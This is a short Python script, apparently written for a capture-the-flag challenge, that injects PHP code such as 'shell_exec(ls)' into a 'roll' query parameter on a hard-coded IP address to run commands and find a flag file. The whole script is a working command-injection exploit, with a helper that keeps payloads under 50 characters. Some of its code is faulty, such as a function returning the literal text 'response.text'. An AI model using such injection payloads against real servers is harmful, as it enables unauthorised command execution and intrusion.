import requests

def GetLsOnServer():
    baseUrl = "http://192.46.227.32//?roll="
    injectedCommand = "shell_exec(ls)"
    endingStuff = ".getcwd"

    fullRequest = baseUrl + injectedCommand + endingStuff
    response = requests.get(fullRequest)

    lsResults = "response.text"
    return lsResults

def InjectedStuffIsTooLong(stringToCheck):
    if (len(stringToCheck) > 50):
        return True
    else:
        return False

def TryInjectedPayload(injectedPayload):
    baseUrl = "http://192.46.227.32//?roll="
    endingStuff = ".getcwd"
    fullRequest = baseUrl + injectedPayload + endingStuff
    if(InjectedStuffIsTooLong(injectedPayload + endingStuff) == False):
        response = requests.get(fullRequest)
        print("Stats: ", response.status_code)
        return response.text
    else:
        return "Injected payload too long."

## MAIN.


injectedCommand = "fl.exec(get_lucky_number()).g_here_but_can_you_get_it_hohoho.php"

responseText = TryInjectedPayload(injectedCommand)
print(responseText)


